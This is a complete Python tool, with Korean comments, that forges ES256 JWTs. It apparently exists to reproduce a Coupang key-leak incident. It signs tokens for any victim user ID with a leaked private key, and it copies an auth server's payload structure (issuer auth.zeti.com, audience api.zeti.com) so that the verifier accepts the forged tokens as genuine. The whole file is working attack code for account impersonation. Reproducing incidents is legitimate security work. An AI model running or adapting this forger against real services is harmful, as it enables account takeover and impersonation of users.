#!/usr/bin/env python3
"""
forge_token.py — ES256 JWT 위조 도구

쿠팡 사고 재현용. 유출된 KMS external import 개인키로 임의 sub의 ES256 토큰을
직접 서명한다. auth-server `JwtIssuer.java`의 페이로드 구조를 그대로 복제하여
api-server `JwtVerifier`가 정상 발급 토큰과 구분 못 하게 만든다.

사용:
    python3 forge_token.py --priv key.pem --sub 140000010

요구 사항:
    pip install cryptography
"""

import argparse
import base64
import json
import sys
import time
import uuid

try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature
except ImportError:
    sys.stderr.write("cryptography 라이브러리가 필요합니다: pip install cryptography\n")
    sys.exit(2)


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--priv", required=True, help="ECDSA P-256 private key (PEM)")
    ap.add_argument("--sub", required=True, help="victim user_id (sub claim)")
    ap.add_argument("--kid", default="alias/jwt-signing-key-external",
                    help="JWS header kid (alias 그대로 사용)")
    ap.add_argument("--exp", type=int, default=600, help="만료(초)")
    args = ap.parse_args()

    with open(args.priv, "rb") as f:
        priv = serialization.load_pem_private_key(f.read(), password=None)

    if not isinstance(priv, ec.EllipticCurvePrivateKey):
        sys.exit("FAIL: EC 개인키 아님")
    if priv.curve.name != "secp256r1":
        sys.exit(f"FAIL: P-256(secp256r1) 기대, 실제 {priv.curve.name}")

    now = int(time.time())

    # JwtIssuer.java와 동일 구조 — auth-server 정상 발급 토큰과 구분 불가하도록
    header = {"alg": "ES256", "kid": args.kid, "typ": "JWT"}
    payload = {
        "acr": "aal1",
        "amr": ["pwd"],
        "aud": ["https://api.zeti.com"],
        "auth_time": now,
        "client_id": "zeti-web",
        "ext": {"LSID": str(uuid.uuid4()), "fiat": now, "v": 2},
        "iat": now,
        "iss": "https://auth.zeti.com/",
        "jti": str(uuid.uuid4()),
        "nbf": now,
        "scp": ["openid", "core"],
        "sub": str(args.sub),
        "exp": now + args.exp,
    }

    h_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_b64}.{p_b64}".encode()

    # ECDSA 서명 → DER → JOSE raw(R||S, 각 32바이트)
    der_sig = priv.sign(signing_input, ec.ECDSA(hashes.SHA256()))
    r, s = decode_dss_signature(der_sig)
    raw = r.to_bytes(32, "big") + s.to_bytes(32, "big")
    s_b64 = b64url(raw)

    print(f"{h_b64}.{p_b64}.{s_b64}")


if __name__ == "__main__":
    main()
